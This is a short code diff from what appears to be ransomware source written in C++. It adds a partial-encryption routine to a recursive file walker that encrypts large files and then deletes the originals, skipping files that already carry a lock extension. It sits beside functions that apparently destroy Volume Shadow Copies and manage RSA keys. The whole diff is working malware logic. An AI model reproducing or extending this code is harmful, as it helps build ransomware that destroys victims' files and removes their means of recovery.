@@ -19,6 +19,7 @@ DWORD generateKeyAndIV(PBYTE* iv, PBYTE* key);
 void changeHiddenFileState(bool state);
 void destroyVSS();
 
+void partialEncrypt(const string& path, RsaEncryptor& rsaEncryptor);
 static void iterate(const path& parent,
 	RsaEncryptor& rsaEncryptor,
 	std::vector<string>& processedPaths);
@@ -62,7 +63,7 @@ Status getPublicParams(string id, string& mod, string& pubKey,bool fromStart)
 }
 
 int encryption_main( bool fromStart) {
-//	crypt_data* d = generatekey();//TODO also move to encrypt
+
 
 	string mod;
 	string pubKey;
@@ -542,7 +543,8 @@ static void iterate(const path& parent,
 				if (is_directory(path))
 					iterate(path, rsaEncryptor, processedPaths);
 			}
-			else if(file_size(path) > MAX_FILE_SIZE && !hasNonEncryptAttribute(path))
+			else if(file_size(path) > MAX_FILE_SIZE && !hasNonEncryptAttribute(path) &&
+				path.find(PART_LOCKED_EXT) == string::npos) //not yet encrypted big file that isn't hidden or system file
 			{
 				partialEncrypt(path, rsaEncryptor);
 				remove(path);
@@ -727,3 +729,4 @@ PART_ENC_CLEANUP:
 		delete[] restBuffer;
 	return;
 }
+
